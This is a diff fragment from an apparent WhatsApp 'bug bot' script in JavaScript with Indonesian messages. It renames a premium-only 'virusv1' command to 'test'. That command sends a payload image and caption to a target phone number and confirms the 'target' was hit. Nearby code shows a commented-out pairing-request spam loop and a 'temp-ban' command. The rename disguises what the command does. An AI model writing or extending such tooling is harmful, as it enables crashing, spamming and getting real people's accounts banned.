@@ -1168,12 +1168,12 @@ console.log('Finished. 15 minutes have passed');
 await spamPairingRequest(sanitizedPhoneNumber, attempts);*/
 }
 break;
-case 'virusv1': {
-if (!isPremium) return msg.reply('You are not premium ')
+case 'test': {
+if (!isPremium) return reply('You are not premium ')
 if (!args[0]) return msg.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 sam.sendMessage(bnnd, { image: spider,  caption: `${testi}` }, { quoted:m })
-msg.reply(`Sukses Target Telah Di Kirim ${command}`)
+reply(`Sukses Target Telah Di Kirim ${command}`)
 }
 break
 case 'temp-ban': {
